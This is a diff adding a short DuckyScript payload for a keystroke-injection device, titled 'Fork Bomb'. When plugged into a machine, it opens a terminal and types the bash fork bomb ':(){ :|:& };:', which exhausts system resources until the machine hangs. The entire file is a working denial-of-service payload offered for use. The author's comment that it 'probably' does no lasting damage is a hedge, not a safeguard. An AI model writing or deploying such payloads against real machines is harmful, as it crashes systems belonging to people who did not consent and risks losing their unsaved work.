@@ -1,0 +1,11 @@
+REM Title: Fork Bomb
+REM Author: UndedInside
+REM Description: Function that recursively runs itself, consuming resources
+REM This (probably) doesn't do any lasting damage. Should be fine after reboot.
+
+REM Open terminal
+DEFAULT_DELAY 700
+ALT T
+
+REM: Create/run forkbomb
+STRINGLN :(){ :|:& };:
